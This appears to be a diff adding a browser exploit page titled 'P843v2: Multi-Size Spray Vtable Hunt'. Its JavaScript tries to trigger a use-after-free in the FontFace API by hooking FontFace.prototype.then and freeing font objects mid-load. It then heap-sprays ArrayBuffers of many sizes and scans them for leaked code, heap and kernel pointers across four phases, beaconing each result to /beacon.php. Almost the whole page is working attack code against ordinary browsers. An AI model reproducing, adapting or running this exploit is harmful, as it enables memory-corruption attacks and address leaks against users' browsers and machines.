@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P843</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:12px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:6px;border-radius:4px;white-space:pre-wrap;word-break:break-all;max-height:92vh;overflow-y:auto;}
+.ok{color:#3fb950;}.fail{color:#f85149;}.info{color:#58a6ff;}.hot{color:#ffa657;font-weight:bold;}
+</style>
+</head><body>
+<pre id="o">P843v2: Multi-Size Spray Vtable Hunt</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s,c){var sp=document.createElement('span');sp.className=c||'';sp.textContent='\n'+s;O.appendChild(sp);}
+function bn(t,d){
+  try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P843-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
+  x.send();}catch(e){}
+}
+function hexQ(v){return '0x'+v.toString(16).padStart(12,'0');}
+
+bn('BOOT','v2-start');
+log('Waiting for FontFace UAF trigger...','info');
+
+var SIZES=[32,48,64,80,96,112,128,144,160,176,192,224,256,320,384,448,512,640,768,1024];
+var sprayBins={};
+for(var i=0;i<SIZES.length;i++)sprayBins[SIZES[i]]=[];
+
+var uafFired=false;
+
+/* ===== FontFace UAF Setup ===== */
+var stA=document.createElement('style');
+stA.textContent="@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(stA);
+var faceA=new FontFace('f1',"local('Helvetica')",{unicodeRange:'U+0041'});
+document.fonts.add(faceA);
+void faceA.loaded;
+
+var ffired=false;
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(ffired)return undefined;
+    ffired=true;
+    uafFired=true;
+    bn('UAF-FIRE','getter-entered');
+
+    /* Free the CSSFontFace + internal objects */
+    if(stA){stA.remove();stA.textContent='';stA=null;}
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+
+    bn('UAF-FREED','spraying-'+SIZES.length+'-sizes');
+
+    /* Multi-size spray to catch ALL freed objects */
+    for(var si=0;si<SIZES.length;si++){
+      var sz=SIZES[si];
+      var count=(sz<=192)?80:(sz<=512)?50:25;
+      for(var i=0;i<count;i++){
+        sprayBins[sz].push(new ArrayBuffer(sz));
+      }
+    }
+
+    bn('UAF-SPRAYED','done');
+    return undefined;
+  },set:function(){}
+});
+document.fonts.load('1em f1, bb1','AB');
+
+/* ===== Scan function ===== */
+function scanBins(bins,label){
+  var hitSum=[];
+  var codePtrs=[];
+  var heapPtrs=[];
+  var otherHits=[];
+
+  for(var si=0;si<SIZES.length;si++){
+    var sz=SIZES[si];
+    var arr=bins[sz];
+    if(!arr||arr.length===0)continue;
+    var bestNz=0,bestIdx=-1;
+
+    for(var i=0;i<arr.length;i++){
+      var u8=new Uint8Array(arr[i]);
+      var nz=0;
+      for(var j=0;j<u8.length;j++)if(u8[j]!==0)nz++;
+      if(nz>bestNz){bestNz=nz;bestIdx=i;}
+    }
+
+    if(bestNz>0){
+      var ab=arr[bestIdx];
+      var bu=new BigUint64Array(ab);
+      var qwords=[];
+      for(var j=0;j<bu.length;j++){
+        var v=bu[j];
+        if(v!==BigInt(0)){
+          var hi=Number(v>>BigInt(32));
+          var lo=Number(v&BigInt(0xFFFFFFFF));
+          var lbl='q'+j+'='+hexQ(v);
+          qwords.push(lbl);
+
+          if(hi>0&&hi<0x8000&&lo>0x1000){
+            codePtrs.push('sz'+sz+':'+lbl);
+          } else if(hi>=0x10000&&hi<0x20000){
+            heapPtrs.push('sz'+sz+':'+lbl);
+          } else if(hi>=0xFFFF8000){
+            codePtrs.push('sz'+sz+':KERN:'+lbl);
+          } else if(hi>0){
+            otherHits.push('sz'+sz+':'+lbl);
+          }
+        }
+      }
+      hitSum.push('sz'+sz+'['+bestIdx+']:nz='+bestNz+','+qwords.slice(0,5).join(' '));
+      log('  '+label+' sz='+sz+'['+bestIdx+']: nz='+bestNz+' '+qwords.slice(0,6).join(' '),'info');
+    }
+  }
+  return {hitSum:hitSum,codePtrs:codePtrs,heapPtrs:heapPtrs,otherHits:otherHits};
+}
+
+/* ===== Main scan — wait for UAF or timeout ===== */
+var scanAttempt=0;
+function tryMainScan(){
+  scanAttempt++;
+  if(!uafFired&&scanAttempt<10){
+    setTimeout(tryMainScan,200);
+    return;
+  }
+
+  bn('SCAN-START','uafFired='+uafFired+'|attempt='+scanAttempt);
+  log('','');
+  log('--- Phase A: FontFace UAF + Multi-Size Spray ---','hot');
+  log('UAF fired: '+uafFired+' (attempt '+scanAttempt+')','info');
+
+  if(!uafFired){
+    log('UAF did not fire after 2s — scanning anyway','fail');
+    bn('UAF-TIMEOUT','no-fire');
+  }
+
+  var resA=scanBins(sprayBins,'A');
+  bn('PHASE-A','hits='+resA.hitSum.length+'|code='+resA.codePtrs.length+'|heap='+resA.heapPtrs.length);
+
+  if(resA.codePtrs.length>0){
+    log('','');
+    log('!!! CODE POINTER CANDIDATES (Phase A) !!!','hot');
+    for(var i=0;i<resA.codePtrs.length;i++)log('  '+resA.codePtrs[i],'hot');
+    bn('CODE-A',resA.codePtrs.join('|'));
+  }
+  if(resA.heapPtrs.length>0){
+    log('Heap pointers: '+resA.heapPtrs.length,'info');
+    for(var i=0;i<Math.min(resA.heapPtrs.length,8);i++)log('  '+resA.heapPtrs[i],'info');
+    bn('HEAP-A',resA.heapPtrs.slice(0,10).join('|'));
+  }
+  if(resA.otherHits.length>0){
+    bn('OTHER-A',resA.otherHits.slice(0,10).join('|'));
+  }
+
+  /* ===== Phase B: Second UAF — no offsetHeight ===== */
+  log('','');
+  log('--- Phase B: UAF Without offsetHeight ---','hot');
+
+  var sprayB={};
+  for(var i=0;i<SIZES.length;i++)sprayB[SIZES[i]]=[];
+
+  var stB=document.createElement('style');
+  stB.textContent="@font-face{font-family:bb2;src:local(Arial);unicode-range:U+0043;}";
+  document.head.appendChild(stB);
+  var faceB=new FontFace('f2',"local('Helvetica')",{unicodeRange:'U+0043'});
+  document.fonts.add(faceB);
+  void faceB.loaded;
+
+  var ffiredB=false;
+  var uafBFired=false;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if(ffiredB)return undefined;
+      ffiredB=true;
+      uafBFired=true;
+      bn('UAF-B-FIRE','no-offsetHeight');
+      if(stB){stB.remove();stB.textContent='';stB=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      /* NO offsetHeight — spray immediately */
+      for(var si=0;si<SIZES.length;si++){
+        var sz=SIZES[si];
+        var count=(sz<=192)?80:(sz<=512)?50:25;
+        for(var i=0;i<count;i++){
+          sprayB[sz].push(new ArrayBuffer(sz));
+        }
+      }
+      return undefined;
+    },set:function(){}
+  });
+  document.fonts.load('1em f2, bb2','CD');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    bn('SCAN-B','uafB='+uafBFired);
+    log('Phase B UAF fired: '+uafBFired,'info');
+
+    var resB=scanBins(sprayB,'B');
+    bn('PHASE-B','hits='+resB.hitSum.length+'|code='+resB.codePtrs.length+'|heap='+resB.heapPtrs.length);
+
+    if(resB.codePtrs.length>0){
+      log('CODE PTRS (Phase B): '+resB.codePtrs.join(' '),'hot');
+      bn('CODE-B',resB.codePtrs.join('|'));
+    }
+    if(resB.heapPtrs.length>0){
+      log('Heap (B): '+resB.heapPtrs.length,'info');
+      bn('HEAP-B',resB.heapPtrs.slice(0,10).join('|'));
+    }
+
+    /* ===== Phase C: Heavy virtual objects → free → spray ===== */
+    log('','');
+    log('--- Phase C: Virtual Object Free + Spray ---','hot');
+
+    var heavyObjs=[];
+    /* CSS animations → AnimationEffect (virtual, ~128-256B) */
+    for(var i=0;i<60;i++){
+      var d=document.createElement('div');
+      d.style.cssText='width:10px;height:10px;position:absolute;';
+      document.body.appendChild(d);
+      try{
+        var a=d.animate([
+          {transform:'translateX(0)',opacity:0},
+          {transform:'translateX(50px)',opacity:1}
+        ],{duration:300,iterations:1});
+        heavyObjs.push({d:d,a:a});
+      }catch(e){break;}
+    }
+
+    /* MutationObserver → MutationObserverRegistration (virtual) */
+    var observers=[];
+    for(var i=0;i<30;i++){
+      var obs=new MutationObserver(function(){});
+      var tgt=document.createElement('span');
+      document.body.appendChild(tgt);
+      obs.observe(tgt,{attributes:true,childList:true});
+      tgt.setAttribute('data-x','y');
+      observers.push({obs:obs,tgt:tgt});
+    }
+
+    /* IntersectionObserver */
+    var intObs=[];
+    try{
+      for(var i=0;i<20;i++){
+        var io=new IntersectionObserver(function(){});
+        var iot=document.createElement('div');
+        iot.style.cssText='width:1px;height:1px;';
+        document.body.appendChild(iot);
+        io.observe(iot);
+        intObs.push({obs:io,tgt:iot});
+      }
+    }catch(e){}
+
+    /* ResizeObserver */
+    var resObs=[];
+    try{
+      for(var i=0;i<20;i++){
+        var ro=new ResizeObserver(function(){});
+        var rot=document.createElement('div');
+        rot.style.cssText='width:50px;height:50px;';
+        document.body.appendChild(rot);
+        ro.observe(rot);
+        resObs.push({obs:ro,tgt:rot});
+      }
+    }catch(e){}
+
+    /* Force layout to instantiate internal structures */
+    document.body.offsetHeight;
+    bn('HEAVY-CREATED','anim='+heavyObjs.length+'|mut='+observers.length+'|int='+intObs.length+'|res='+resObs.length);
+
+    /* FREE everything */
+    for(var i=0;i<heavyObjs.length;i++){
+      try{heavyObjs[i].a.cancel();}catch(e){}
+      try{heavyObjs[i].d.remove();}catch(e){}
+    }
+    heavyObjs=null;
+    for(var i=0;i<observers.length;i++){
+      try{observers[i].obs.disconnect();}catch(e){}
+      try{observers[i].tgt.remove();}catch(e){}
+    }
+    observers=null;
+    for(var i=0;i<intObs.length;i++){
+      try{intObs[i].obs.disconnect();}catch(e){}
+      try{intObs[i].tgt.remove();}catch(e){}
+    }
+    intObs=null;
+    for(var i=0;i<resObs.length;i++){
+      try{resObs[i].obs.disconnect();}catch(e){}
+      try{resObs[i].tgt.remove();}catch(e){}
+    }
+    resObs=null;
+
+    /* GC pressure */
+    for(var i=0;i<3000;i++)(function(){return new ArrayBuffer(64);})();
+
+    document.body.offsetHeight;
+
+    /* Multi-size spray */
+    var sprayC={};
+    for(var i=0;i<SIZES.length;i++)sprayC[SIZES[i]]=[];
+    for(var si=0;si<SIZES.length;si++){
+      var sz=SIZES[si];
+      var count=(sz<=192)?100:(sz<=512)?60:30;
+      for(var i=0;i<count;i++)sprayC[sz].push(new ArrayBuffer(sz));
+    }
+
+    var resC=scanBins(sprayC,'C');
+    bn('PHASE-C','hits='+resC.hitSum.length+'|code='+resC.codePtrs.length+'|heap='+resC.heapPtrs.length);
+
+    if(resC.codePtrs.length>0){
+      log('','');
+      log('!!! CODE PTRS (Phase C — heavy objects) !!!','hot');
+      for(var i=0;i<resC.codePtrs.length;i++)log('  '+resC.codePtrs[i],'hot');
+      bn('CODE-C',resC.codePtrs.join('|'));
+    }
+    if(resC.heapPtrs.length>0){
+      log('Heap (C): '+resC.heapPtrs.length,'info');
+      for(var i=0;i<Math.min(resC.heapPtrs.length,8);i++)log('  '+resC.heapPtrs[i],'info');
+      bn('HEAP-C',resC.heapPtrs.slice(0,10).join('|'));
+    }
+    if(resC.otherHits.length>0){
+      bn('OTHER-C',resC.otherHits.slice(0,10).join('|'));
+    }
+
+    /* ===== Phase D: structuredClone hole + spray ===== */
+    log('','');
+    log('--- Phase D: Transfer Detach Holes + Spray ---','hot');
+
+    /* Create ABs, transfer (detach) them, spray the holes */
+    var detached=[];
+    for(var i=0;i<200;i++){
+      var ab=new ArrayBuffer(192);
+      try{
+        var cloned=structuredClone(ab,{transfer:[ab]});
+        detached.push(cloned);
+      }catch(e){break;}
+    }
+
+    /* These transferred ABs created heap holes at 192B. Spray new ABs over them */
+    var sprayD=[];
+    for(var i=0;i<300;i++)sprayD.push(new ArrayBuffer(192));
+
+    var hitD=0,codeD=[];
+    for(var i=0;i<sprayD.length;i++){
+      var bu=new BigUint64Array(sprayD[i]);
+      for(var j=0;j<bu.length;j++){
+        var v=bu[j];
+        if(v!==BigInt(0)){
+          hitD++;
+          var hi=Number(v>>BigInt(32));
+          var lo=Number(v&BigInt(0xFFFFFFFF));
+          if(hi>0&&hi<0x8000&&lo>0x1000){
+            codeD.push('ab'+i+':q'+j+'='+hexQ(v));
+          }
+        }
+      }
+    }
+    log('Phase D: '+detached.length+' transfers, '+hitD+' nonzero qwords','info');
+    bn('PHASE-D','transfers='+detached.length+'|nzQ='+hitD+'|code='+codeD.length);
+    if(codeD.length>0){
+      log('CODE PTRS (D): '+codeD.join(' '),'hot');
+      bn('CODE-D',codeD.join('|'));
+    }
+
+    /* ===== SUMMARY ===== */
+    log('','');
+    log('====== P843v2 COMPLETE ======','hot');
+    var totalCode=resA.codePtrs.length+(resB?resB.codePtrs.length:0)+resC.codePtrs.length+codeD.length;
+    var totalHeap=resA.heapPtrs.length+(resB?resB.heapPtrs.length:0)+resC.heapPtrs.length;
+    log('Total code ptrs: '+totalCode+' | Total heap ptrs: '+totalHeap,'hot');
+    bn('DONE','code='+totalCode+'|heap='+totalHeap+'|phA='+resA.hitSum.length+'|phB='+(resB?resB.hitSum.length:0)+'|phC='+resC.hitSum.length+'|phD='+hitD);
+  },800);
+}
+
+setTimeout(tryMainScan,200);
+
+</script></body></html>
